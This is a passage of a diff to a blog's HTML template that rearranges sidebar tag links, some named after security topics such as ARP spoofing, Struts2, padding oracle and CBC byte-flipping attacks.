+                <a href="javascript:void(0)" class="js-tag color1">https</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">Arp欺骗</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">kali</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">excel</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">算法</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">递归</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -624,26 +659,6 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">apache</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">https</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">Struts2</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">运维</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">LAMP</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">CVE</a>
               </li>
              
@@ -652,35 +667,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">Arp欺骗</a>
+                <a href="javascript:void(0)" class="js-tag color3">运维</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">kali</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">流量分析</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">算法</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">递归</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">excel</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">CBC字节翻转攻击</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">Padding oracle攻击</a>
+                <a href="javascript:void(0)" class="js-tag color5">LAMP</a>
               </li>
             
             <div class="clearfix"></div>
